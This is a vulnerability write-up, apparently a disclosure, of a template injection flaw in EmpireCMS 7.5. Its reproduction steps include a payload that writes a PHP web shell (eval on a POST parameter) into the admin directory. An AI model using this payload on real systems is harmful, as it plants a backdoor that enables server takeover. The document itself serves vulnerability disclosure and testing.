# EmpireCMS-Getshell

### Introduction to EmpireCMS 

EmpireCMS is an open-source content management system (CMS).

download link：http://www.phome.net/downcenter/empirecms/ecms75/download/EmpireCMS_7.5_SC_UTF8.zip

### Vulnerability description

EmpireCMS v7.5 has a template injection vulnerability. An authenticated remote attacker can exploit this vulnerability to inject malicious content through the PreviewIndexpage class in e/class/tempfun.php, thereby getting the shell.

### vulnerability analysis

The vulnerability exists in line 425 of tmepfun. Due to the lack of effective validation of the parameter content passed in by the frontend, malicious content can be referenced and generate an index page template file, resulting in malicious content being written

![image-20231206113402099](EmpireCMS/image/image-20240730103644857.png)

### Vulnerability reproduction

1、Log in to the backend  -> check "模板" -> "管理首页方案" -> Modify template content:

```
Vulnerability verification POC ：<?php phpinf0(); ?>
```

![image-20240730104109557](EmpireCMS-Getshell.assets/image-20240730104109557.png)

2、After submitting, click "预览"：

![image-20240730104436737](EmpireCMS-Getshell.assets/image-20240730104436737.png)

The injected malicious content is referenced and executed：

![image-20240730104534523](EmpireCMS-Getshell.assets/image-20240730104534523.png)

3、The server generates indexpage temporary file，The path is：/e/data/tmp/indexpage{tempid}.php

![image-20240730104922561](EmpireCMS-Getshell.assets/image-20240730104922561.png)

4、POC and change to：

```
test <?php fputs(fopen('shell.php','w'),'<?php eval($_POST[9527])?>');?>
```

Automatically generate shell.chp in e/admin

![image-20240730110245130](EmpireCMS-Getshell.assets/image-20240730110245130.png)



![image-20240730110005192](EmpireCMS-Getshell.assets/image-20240730110005192.png)
